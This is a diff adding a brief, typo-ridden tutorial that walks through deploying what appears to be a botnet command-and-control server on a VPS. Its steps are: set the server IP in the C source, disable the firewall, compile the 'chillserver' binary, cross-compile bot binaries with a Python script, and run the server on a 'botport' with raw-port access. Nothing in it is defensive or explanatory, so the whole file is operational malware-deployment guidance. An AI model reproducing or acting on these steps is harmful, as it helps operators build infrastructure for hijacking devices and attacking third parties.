@@ -1,0 +1,25 @@
+Darian tutrotial
+
+FIRST CHANGE IP IN CHB/main.c LINES 39-42
+
+run these commands in your vps
+
+yum install python-paramiko nano screen gcc perl wget lbzip unzip bzip2 httpd -y
+
+service httpd stop; service firewalld stop
+
+gcc chill.c -o chillserver -pthread
+
+python chill.py anythinghereitdoesntmatter SERVERIP binsname
+
+do y do download cross compilers unless you already did
+
+screen ./chillserver 5555 1
+
+                       ^^ this is the default botport change it if you changed it in the main.c file
+
+hit CTRL a + d
+
+logs are in the CHLogs folder
+
+connection type is raw port to connect to by defualt is 444
